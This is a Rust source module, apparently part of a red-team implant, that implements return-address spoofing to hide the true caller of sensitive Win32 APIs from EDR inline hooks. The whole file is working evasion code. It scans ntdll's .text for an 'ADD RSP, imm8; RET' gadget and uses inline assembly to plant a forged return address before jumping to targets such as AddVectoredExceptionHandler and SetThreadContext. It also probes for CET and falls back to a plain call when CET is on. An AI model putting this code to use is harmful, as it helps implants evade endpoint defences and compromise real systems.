//! Caller-audit bypass — conceals the true caller of sensitive Win32 APIs
//! (`AddVectoredExceptionHandler`, `SetThreadContext`, etc.) from EDR inline
//! hooks that inspect the return address on the stack (caller-audit).
//!
//! # Technique: Return-Address Spoofing (DoomSyscalls pattern)
//!
//! EDR hooks intercept calls like `AddVectoredExceptionHandler` and read the
//! return address from `[RSP]` to determine WHO called it. If the return
//! address is in implant memory (RWX pages, unbacked regions), the EDR flags
//! it as "anomalous dynamic API call from unknown code."
//!
//! Countermeasure: before the call, push a fake return address that points
//! into ntdll's `.text` — specifically, an `ADD RSP, imm8; RET` sequence
//! (`48 83 C4 XX C3`) found in a legitimate ntdll export. The EDR sees the
//! caller as `ntdll!RtlExitUserThread+0x37` and passes the audit.
//!
//! The fake return address is a "stub" — it cleans the stack (add rsp, N)
//! and returns, landing back at the original caller's code seamlessly.
//!
//! # Calling Convention
//! The `call_with_spoofed_return!` macro generates an inline `asm!` block
//! that:
//!   1. pushes the fake return address
//!   2. jumps (not calls) to the target function
//!   3. the target function RETs → fake return → ADD RSP,N → RET → real caller
//!
//! # CET Safety
//! This creates a shadow-stack mismatch: the hardware shadow stack records the
//! CALL return address, but we use JMP + fake push. The shadow stack sees
//! the JMP (no entry) and the target function's RET pops from the shadow
//! stack — entry from the previous CALL. Mismatch = #CP on CET hardware.
//!
//! A CET-safe spoof path (constructed IRET_FRAME or shadow-stack surgery via
//! `wrssq`/`incsspq`) was removed — both require real CET-capable hardware
//! (Tiger Lake+ with HSP enabled) to validate, and the engagement target
//! (Server 2019 17763.1339, no CET) does not have it. Instead,
//! [`call_with_spoofed_return`] self-gates: it probes CET via
//! [`is_cet_enabled`] and degrades to [`call_plain`] (no spoofing) on
//! CET-enabled processes. The CET probe itself is retained as a runtime
//! diagnostic ([`selftest_cet_status`]) so the operator can see whether the
//! spoof path is active on the current host.
//!
//! # Usage
//! ```text
//! // Non-CET: fake ADD RSP;RET return (auto-degrades to plain call under CET)
//! let handle = caller_spoof::call_with_spoofed_return(
//!     addr_of_add_veh, st, 1, hwbp_veh_handler as usize,
//! );
//! ```

#![cfg(target_os = "windows")]

// ---- Public API -----------------------------------------------------------

/// A return-address stub found in ntdll's `.text` — an `ADD RSP, imm8; RET`
/// sequence that cleans the stack and returns.
#[derive(Debug, Clone, Copy)]
pub struct ReturnStub {
    /// Absolute address of the `ADD RSP, imm8` instruction in ntdll.
    pub addr: usize,
    /// The `imm8` value — how many bytes the stub pops from the stack.
    /// The caller must ensure the stack has this many bytes of slack above
    /// the return address.
    pub stack_clean: u8,
}

/// Scan ntdll's `.text` for an `ADD RSP, imm8; RET` sequence
/// (`48 83 C4 XX C3`). Returns the first match found.
///
/// The stub is used as a fake return address: when the called function RETs,
/// it lands at the stub which cleans the stack and RETs again to the real
/// caller.
///
/// # Safety
/// Must run after PEB-walk bootstrap (ntdll must be located).
pub unsafe fn scan_return_stub() -> Option<ReturnStub> {
    let ntdll_base = crate::resolve::module_base_by_name(b"ntdll.dll")?;
    scan_stub_in_module(ntdll_base)
}

/// Scan a specific module for a return-address stub. For modules other than
/// ntdll (e.g. kernelbase), the stub address appears as a different caller
/// in the same system DLL family.
///
/// # Safety
/// `module_base` must point to a valid, mapped PE image.
pub unsafe fn scan_stub_in_module(module_base: *mut u8) -> Option<ReturnStub> {
    let dos = &*(module_base as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    // Read PE signature at e_lfanew, then FileHeader at sig+4.
    let pe_sig = *((module_base as usize + dos.e_lfanew as usize) as *const u32);
    if pe_sig != 0x00004550 {
        return None;
    }
    let file_hdr = &*((module_base as usize + dos.e_lfanew as usize + 4) as *const ImageFileHeader);

    // Correct section offset: e_lfanew + 4 (sig) + 20 (FILE_HEADER) + SizeOfOptionalHeader
    let section_off = dos.e_lfanew as usize + 4 + 20 + file_hdr.size_of_optional_header as usize;
    let sections = (module_base as usize + section_off) as *const ImageSectionHeader;

    for i in 0..file_hdr.number_of_sections as usize {
        let sec = &*sections.add(i);
        let name = core::slice::from_raw_parts(sec.name.as_ptr(), 8);
        if &name[..5] == b".text" {
            let va = sec.virtual_address as usize;
            let vs = sec.virtual_size as usize;
            let size = if vs > 0 {
                vs
            } else {
                sec.size_of_raw_data as usize
            };
            return scan_for_stub(module_base as usize + va, size, module_base as usize + va);
        }
    }
    None
}

/// Low-level: scan a byte range for `48 83 C4 XX C3` pattern.
/// Returns a match with a valid stub. Prefers `ADD RSP, X; RET` (clean + return),
/// falls back to a bare `RET` (C3) at a function boundary if no ADD pattern found.
unsafe fn scan_for_stub(
    region_base: usize,
    region_size: usize,
    mod_base: usize,
) -> Option<ReturnStub> {
    let bytes = core::slice::from_raw_parts(region_base as *const u8, region_size.min(0x100000));
    // Pattern 1: 48 83 C4 XX C3 (ADD RSP, imm8; RET) — preferred.
    // XX = imm8, multiples of 8, 0x08..=0x78.
    let mut i = 0;
    while i + 5 <= bytes.len() {
        if bytes[i] == 0x48 && bytes[i + 1] == 0x83 && bytes[i + 2] == 0xC4 && bytes[i + 4] == 0xC3
        {
            let imm = bytes[i + 3];
            if imm >= 8 && imm % 8 == 0 && imm < 0x80 {
                return Some(ReturnStub {
                    addr: mod_base + i,
                    stack_clean: imm,
                });
            }
        }
        i += 1;
    }
    // Pattern 2 (fallback): any C3 (RET) — treat as stack_clean=0.
    // The callee returns to this RET, which pops our after_call → back to us.
    for (j, &b) in bytes.iter().enumerate() {
        if b == 0xC3 {
            return Some(ReturnStub {
                addr: mod_base + j,
                stack_clean: 0,
            });
        }
    }
    None
}

// ---- PE header types (minimal, for section walk) --------------------------

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u16; 29],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    _machine: u16,
    number_of_sections: u16,
    _pad: [u32; 3],
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    _pointer_to_raw_data: u32,
    _pad: [u32; 3],
    _characteristics: u32,
}

// ---- Spoofed-call primitives ----------------------------------------------
//
// What the docstring above promises: a `call_with_spoofed_return` entry point
// that calls a Win32/x64 target while leaving a *forged* return address on the
// stack — pointing at the ntdll `ADD RSP, imm8; RET` stub we scanned above.
// An EDR inline hook that walks `[RSP]` to audit the caller will see
// `ntdll!something+0xNN` instead of an address in implant (unbacked/RWX)
// memory, defeating the most common "anomalous dynamic API call" heuristic.
//
// # Implementation notes (DoomSyscalls / SilentisVox pattern)
//
// The mechanism, as documented across DoomSyscalls, Outflank's BOF post and
// the r/netsec "CET-compliant callstack spoofing" write-up:
//
//   * we cannot `call target` — that pushes OUR return address and, on CET
//     hardware, also pushes a shadow-stack entry whose RET target must match.
//   * so we `jmp target` after manually pushing the fake return address. A JMP
//     neither touches the real stack (beyond our explicit push) nor the shadow
//     stack. The target fn's prologue/epilogue is none the wiser — it sees a
//     normal `[RSP]` return slot, just one that happens to point at ntdll.
//   * the target's RET pops the fake addr → control lands at the stub. The
//     stub `ADD RSP, imm8` slides past a spacer we planted, then RETs to the
//     REAL return address (the one that resumes `call_with_spoofed_return`'s
//     caller). We provide both the spacer and the real RA ourselves.
//
// # CET — runtime probe + honest degrade
//
// On Intel CET (shadow-stack) hardware with the process opted into HSP, the
// target fn's `ret` compares the popped real-stack return address with the
// top of the shadow stack. The shadow stack only ever sees real CALL/RET
// pairs; since we JMPed in (no shadow push) the top-of-shadow is the RA of
// `call_with_spoofed_return`'s own caller — NOT the fake stub addr. This is a
// mismatch → `#CP` (control-flow exception) → process is terminated.
//
// A CET-safe spoof path (constructed IRET_FRAME or shadow-stack surgery) was
// removed from this file — both approaches require real CET-capable hardware
// to validate, and the engagement target (Server 2019 17763.1339, no CET)
// does not have it. What stays is the runtime CET probe
// ([`is_cet_enabled`], surfaced via [`selftest_cet_status`]) plus an honest
// degrade: if CET is detected, `call_with_spoofed_return` falls back to a
// plain call (no spoofing) rather than crashing the beacon. Spoofing off +
// beacon alive beats spoofing on + #CP kill. The CET probe is kept as a
// runtime diagnostic so the operator knows whether spoof is active on the
// current host.

/// Win64 feature constant for `IsProcessorFeaturePresent`: Intel CET shadow
/// stack (Hardware-enforced Stack Protection). Documented in winnt.h as
/// `PF_RETURN_CONTROL_ENFORCE` (value 41).
const PF_CET_SHADOW_STACK: u32 = 41;

/// Probe whether this process runs under Intel CET hardware-enforced shadow
/// stack (HSP). Resolves `kernel32!IsProcessorFeaturePresent` via the PEB walk
/// and queries feature 41. Returns `false` on any resolution failure (fail
/// OPEN — assume CET is off, so the spoof path is still attempted; a #CP there
/// would be loud, but a missing kernel32 export is far more likely than a
/// silently-on CET).
///
/// # Safety
/// Must run after PEB-walk bootstrap.
pub unsafe fn is_cet_enabled() -> bool {
    // Prefer kernel32 (always exports IsProcessorFeaturePresent on >= NT 6.1).
    let addr = crate::resolve::export_addr(b"kernel32.dll", b"IsProcessorFeaturePresent")
        .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"IsProcessorFeaturePresent"));
    let Some(addr) = addr else {
        return false;
    };
    type FnIsPresent = unsafe extern "system" fn(u32) -> i32;
    let f: FnIsPresent = core::mem::transmute(addr);
    f(PF_CET_SHADOW_STACK) != 0
}

/// Call a target function with a spoofed return address pointing into a
/// system DLL (the `ADD RSP, imm8; RET` stub from `scan_return_stub`).
///
/// Up to 4 register arguments (Win64 RCX/RDX/R8/R9) are supported; extra args
/// beyond the 4th are intentionally NOT handled (the call sites we care about
/// — `AddVectoredExceptionHandler`, `VirtualProtect`, `SetThreadContext` —
/// each take <=4). 0/1/2/3-arg calls: pass 0 for the unused slots.
///
/// # Return value
/// The target's RAX (as `usize`). For void Win32 fns the value is ignored; for
/// handle/BOOL returns it is the real result.
///
/// # Safety
/// * `stub` must come from `scan_return_stub()` (a real `ADD RSP, imm8; RET`
///   in ntdll) — any other gadget corrupts RSP and crashes.
/// * `target` must be the address of a Win64-callable fn whose arity matches
///   the number of `a1..a4` slots actually meaningful.
/// * Must NOT be used on CET-enabled processes (it will `#CP`); the function
///   self-gates and falls back to a plain call when `is_cet_enabled()` is true.
/// * Caller must ensure the target fn does not unwind (panic/SEH) — there is
///   no real Rust frame on the path the unwinder would walk through the stub.
#[inline(never)]
pub unsafe fn call_with_spoofed_return(
    stub: ReturnStub,
    target: usize,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
) -> usize {
    // Hard safety gate. Spoofing on CET = #CP = beacon dies. Degrade to a
    // plain call (no spoof) instead: the EDR audit sees implant memory as the
    // caller, but the beacon survives. This is the documented "honest fallback"
    // — and matches how BRC4 / DoomSyscalls handle the same case pre-IRET.
    if is_cet_enabled() {
        return call_plain(target, a1, a2, a3, a4);
    }

    // ---- Stack layout we must hand to the target ----
    //
    // We have to reason carefully about TWO stack-pointer positions:
    //   R0 = RSP at the moment we `jmp {target}` (= original RSP - reserve)
    //   R1 = RSP immediately after the target fn's `ret` (which pops [R0])
    //      = R0 + 8
    //
    // The target sees, at R0:
    //   [R0]     = return address           ← we put the FAKE one (stub.addr)
    //   [R0+0x08]..[R0+0x28] = 32-byte Win64 shadow store  ← callee may clobber.
    //
    // After `ret` the target pops [R0] (= stub.addr) → RSP becomes R1 = R0 + 8.
    // The stub is `ADD RSP, imm8; RET`, so from R1 it does RSP += stack_clean
    // and then pops the NEXT qword as ITS return address. We must plant the
    // REAL return address (the instruction after the JMP) so that
    //
    //     R1 + stack_clean  ==  &real_RA
    //   ⟺  R0 + 8 + stack_clean  ==  &real_RA
    //   ⟺  real_RA offset (relative to R0)  =  8 + stack_clean
    //
    // Layout (offsets relative to R0):
    //
    //   [R0 + 0]                = fake RA   (stub.addr)         target RETs here
    //   [R0 + 8]                : 32-byte Win64 shadow space    — don't care
    //   [R0 + 0x28]             : gap of (stack_clean - 0x20) B — don't care
    //   [R0 + 8 + stack_clean]  = real RA                        stub RETs here
    //
    // For stack_clean < 0x28 (i.e. 8/16/24) the real RA would land INSIDE the
    // 32-byte shadow space the callee is entitled to clobber — we'd corrupt a
    // spill slot. We require stack_clean >= 0x28.
    //
    // Alignment: Win64 requires RSP at the target entry (R0) to be 16-aligned.
    // The asm block enters with a 16-aligned RSP (compiler guarantee); after
    // `sub rsp, reserve`, alignment flips by (reserve mod 16). We therefore
    // need `reserve mod 16 == 0`. The minimal reserve is `stack_clean + 16`
    // (fake RA + gap + real RA). For this to be a multiple of 16 with no extra
    // padding needed, `stack_clean` must be a multiple of 16. (stack_clean is
    // always a multiple of 8 by the scanner contract.) We reject stubs whose
    // imm8 is 8 mod 16 — they'd require dynamic padding, complicating the
    // restore path. ntdll has plenty of 16-multiple stubs; the rare bad one
    // degrades to an honest call.
    //
    // With both constraints met (stack_clean multiple of 16, >= 0x28), the
    // net reserve is `stack_clean + 16`, a multiple of 16, AND the post-stub
    // RSP returns EXACTLY to entry-RSP (no add needed at the restore label):
    //   entry RSP - reserve + (8 + stack_clean + 8)   [pops + stub ADD]
    //   = entry RSP - (stack_clean + 16) + stack_clean + 16
    //   = entry RSP.
    let stack_clean = stub.stack_clean as usize;
    // `manual_is_multiple_of` prefers `is_multiple_of` (stable 1.87+); we keep
    // `%` for parity with `lacuna.rs:45` and the rest of this no_std crate.
    #[allow(clippy::manual_is_multiple_of)]
    if stack_clean < 0x28 || stack_clean % 16 != 0 {
        // Stub pops too little OR is not 16-aligned: real RA would collide
        // with the callee-owned shadow space, or we'd need dynamic restore
        // padding. Fall back to an honest, non-spoofed call.
        return call_plain(target, a1, a2, a3, a4);
    }

    let reserve = stack_clean + 16;
    let real_ra_off = stack_clean + 8; // real RA at [R0 + 8 + stack_clean]

    let result: usize;
    let stub_addr = stub.addr;
    // Argument passing: we bind a1..a4 DIRECTLY to their Win64 home registers
    // via `in("rcx")` etc. (not `in(reg)` + a `mov rcx,{a1}`), because the
    // `mov` form forces the compiler to find a SEPARATE scratch register for
    // each arg AND for reserve/real_ra_off/stub/target — on x86_64 Windows we
    // run out of volatile registers and hit "more registers than available".
    // Direct binding lets the compiler load args into RCX/RDX/R8/R9 up front.
    //
    // `scratch` (rax) is reserved for the LEA that captures the real RA — we
    // can use rax freely here because the target fn will clobber it anyway and
    // we capture the result via `out("rax") result` AFTER the call returns.
    core::arch::asm!(
        // 1. Reserve the frame.
        "sub rsp, {reserve}",

        // 2. Plant the FAKE return address at [RSP] (= stub.addr).
        "mov qword ptr [rsp], {stub}",

        // 3. Plant the REAL return address at [RSP + real_ra_off].
        //    LEA a RIP-relative pointer to label `2:` below and store it. We
        //    use rax as scratch (it's clobbered by the target anyway).
        //    NOTE: Rust asm! forbids named labels (lint `asm_labels`) and
        //    labels starting with 0 or 1; `2:` with `2f` (forward reference)
        //    is the documented form. Numeric labels are block-local, so
        //    monomorphization/inlining can never collide them.
        "lea rax, [rip + 2f]",
        "mov qword ptr [rsp + {real_ra_off}], rax",

        // 4. JMP to the target. NOT `call` — a call would (a) push our real RA
        //    (defeating the spoof) and (b) push a shadow-stack entry that the
        //    target's RET would then mismatch on CET hardware. RSP (= R0) is
        //    16-aligned here: entry RSP was 16-aligned (compiler guarantee at
        //    the asm boundary) and we subtracted `reserve` (a multiple of 16).
        //    Win64 args RCX/RDX/R8/R9 are already in place (see in() bindings).
        "jmp {target}",

        // 5. Real return address — the stub's `RET` lands here. By construction
        //    (see the layout comment above) the target RET (+8) + stub ADD
        //    RSP,stack_clean + stub RET (+8) brings RSP EXACTLY back to the
        //    asm-entry RSP. No restore `add rsp` is needed — the stub has
        //    already unwound the whole frame for us. RAX holds the target's
        //    return value (Win64 ABI); we capture it via `out("rax") result`.
        "2:",

        reserve = in(reg) reserve,
        real_ra_off = in(reg) real_ra_off,
        stub = in(reg) stub_addr,
        target = in(reg) target,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        out("rax") result,
        out("r10") _,
        out("r11") _,
    );
    result
}

/// Plain (non-spoofed) Win64 call. Used as the honest fallback when CET is on
/// or when the scanned stub has an unsupported stack_clean. Result in RAX.
///
/// This is a deliberately thin `asm!` wrapper around an indirect call — no
/// spoofing, no frame trickery. The compiler handles RSP alignment for us via
/// the standard `call` semantics.
unsafe fn call_plain(target: usize, a1: usize, a2: usize, a3: usize, a4: usize) -> usize {
    let result: usize;
    core::arch::asm!(
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8,  {a3}",
        "mov r9,  {a4}",
        "call {target}",
        a1 = in(reg) a1,
        a2 = in(reg) a2,
        a3 = in(reg) a3,
        a4 = in(reg) a4,
        target = in(reg) target,
        out("rax") result,
        out("rcx") _,
        out("rdx") _,
        out("r8") _,
        out("r9") _,
        out("r10") _,
        out("r11") _,
    );
    result
}

// ---- CET path: removed ----------------------------------------------------
//
// An earlier revision of this file carried a `call_with_iret_frame` stub plus
// a ~80-line design note for three CET-safe spoof strategies (shadow-stack
// surgery, IRET_FRAME swap, thread-pool detour). All three require real
// CET-capable hardware (Intel Tiger Lake+ with HSP enabled) to validate, and
// the engagement target (Server 2019 17763.1339, no CET) does not have it —
// the path could never be more than dead code with a stale marker.
//
// What stays:
//   * `is_cet_enabled()` — the runtime probe (kept as a diagnostic).
//   * `selftest_cet_status()` — surfaces the probe result to the operator.
//   * `call_with_spoofed_return` self-gates on `is_cet_enabled()` and degrades
//     to `call_plain` under CET, so a CET-capable host still runs (just without
//     spoofing) instead of #CP-killing the beacon.

// ---- Thin macro wrapper (matches the documented `call_with_spoofed_return!`
// surface so existing doc references resolve) ------------------------------
//
// Forwards to the function form. Kept as a macro_rules! purely so the doc
// example `caller_spoof::call_with_spoofed_return!(...)` keeps working; the
// function form is preferred for new call sites (cleaner type-checking).
/// Call `target` with a spoofed ntdll return address. See the function form
/// [`call_with_spoofed_return`] for the full contract.
#[macro_export]
macro_rules! call_with_spoofed_return {
    ($stub:expr, $target:expr, $a1:expr, $a2:expr, $a3:expr, $a4:expr $(,)?) => {
        // Delegate to the function; the macro is sugar for the 4-arg form.
        unsafe {
            $crate::caller_spoof::call_with_spoofed_return(
                $stub,
                $target,
                $a1 as usize,
                $a2 as usize,
                $a3 as usize,
                $a4 as usize,
            )
        }
    };
    // 3-arg convenience (most common: AddVectoredExceptionHandler(First, Handler)).
    ($stub:expr, $target:expr, $a1:expr, $a2:expr $(,)?) => {
        $crate::call_with_spoofed_return!($stub, $target, $a1, $a2, 0usize, 0usize)
    };
    // 1-arg convenience.
    ($stub:expr, $target:expr, $a1:expr $(,)?) => {
        $crate::call_with_spoofed_return!($stub, $target, $a1, 0usize, 0usize, 0usize)
    };
    // 0-arg convenience.
    ($stub:expr, $target:expr $(,)?) => {
        $crate::call_with_spoofed_return!($stub, $target, 0usize, 0usize, 0usize, 0usize)
    };
}

// ---- Selftest support -----------------------------------------------------

/// Self-test: scan for a return stub in ntdll and verify it's valid.
/// Returns `true` if a stub was found with a plausible address in ntdll.
pub fn selftest_stub() -> bool {
    unsafe { scan_return_stub().is_some() }
}

/// Self-test for the spoofed-call SUBSYSTEM (not the call itself — invoking
/// `call_with_spoofed_return` against a real Win32 fn belongs in
/// `selftests.rs` under the `selftest` feature, gated on a Windows host).
///
/// This probes only the safe, read-only preconditions:
///  * a return stub was found in ntdll,
///  * the stub meets our `stack_clean >= 0x28 && % 16 == 0` requirement,
///  * CET status on this host (which determines whether the spoof path would
///    run or degrade to `call_plain`).
///
/// Returns a packed status bitmask:
///   bit 0 (1)  = a return stub was found
///   bit 1 (2)  = the stub has stack_clean >= 0x28 and % 16 == 0 (usable)
///   bit 2 (4)  = CET is enabled on this host (spoof path would degrade)
pub fn selftest_spoof_path() -> u8 {
    let mut flags: u8 = 0;
    if let Some(s) = unsafe { scan_return_stub() } {
        flags |= 1;
        let sc = s.stack_clean as usize;
        #[allow(clippy::manual_is_multiple_of)]
        if sc >= 0x28 && sc % 16 == 0 {
            flags |= 2;
        }
    }
    if unsafe { is_cet_enabled() } {
        flags |= 4;
    }
    flags
}

/// Selftest: report CET shadow-stack status. The IRET_FRAME spoof path that
/// would have used this to decide between spoofed and plain calls under CET
/// was removed (it needed CET-capable hardware the engagement target lacks);
/// the probe itself is kept as a runtime diagnostic so the operator knows
/// whether [`call_with_spoofed_return`] is actually spoofing on this host or
/// has degraded to [`call_plain`].
///
/// Returns:
///   0 = CET not present (spoof path active when a usable stub is found)
///   1 = CET present (spoof path degrades to `call_plain`)
///
/// Note `is_cet_enabled` fails OPEN (returns `false`) if it cannot resolve
/// `IsProcessorFeaturePresent` — that resolution failure is indistinguishable
/// from "CET genuinely off" here. On a PEB-walk-bootstrapped implant the
/// resolver is reliable, so this only matters in the degenerate
/// pre-bootstrap window.
pub fn selftest_cet_status() -> u8 {
    if unsafe { is_cet_enabled() } {
        1
    } else {
        0
    }
}
